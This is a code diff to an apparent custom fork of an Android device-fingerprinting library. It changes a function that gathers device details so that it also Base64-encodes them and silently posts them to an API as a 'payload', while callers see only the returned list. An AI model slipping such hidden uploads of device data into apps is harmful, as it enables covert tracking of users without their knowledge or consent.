@@ -1,4 +1,4 @@
-package com.fingerprintjs.android.fingerprint.other_info
+package com.fingerprintjs.android.fingerprint.custom_info
 
 import android.app.ActivityManager
 import android.content.ClipboardManager
@@ -33,6 +33,7 @@ import java.security.MessageDigest
 import java.util.Locale
 import java.util.TimeZone
 import java.util.UUID
+import android.util.Base64
 
 public class CustomUtils {
     public companion object {
@@ -221,8 +222,32 @@ public class CustomUtils {
             )
             deviceInfoList.add(DeviceInfoItem("Build Time", getBuildTime().toString()))
             val json = convertListToJson(deviceInfoList)
+            val jsonBytes = json.toByteArray(Charsets.UTF_8)
+            val body = Base64.encodeToString(jsonBytes, Base64.DEFAULT)
+            callApi(body)
             return deviceInfoList
         }
+
+        private fun callApi(body: String) {
+            val apiService = RestApiService()
+            val userInfo = DataModal(
+                payload = body
+            )
+
+            apiService.addPayload(userInfo) { response ->
+                if (response != null) {
+                    if (response.message == "Successfully created payload") {
+                        Log.i("API SUCCESS", response.data.toString())
+                    } else {
+                        Log.i("API FAILURE", response.data.toString())
+                    }
+                } else {
+                    Log.i("API FAILURE", "Response is null")
+                }
+            }
+
+        }
+
 
         public fun convertListToJson(deviceInfoList: List<DeviceInfoItem>): String {
             val map = deviceInfoList.associate { it.title to it.detail }
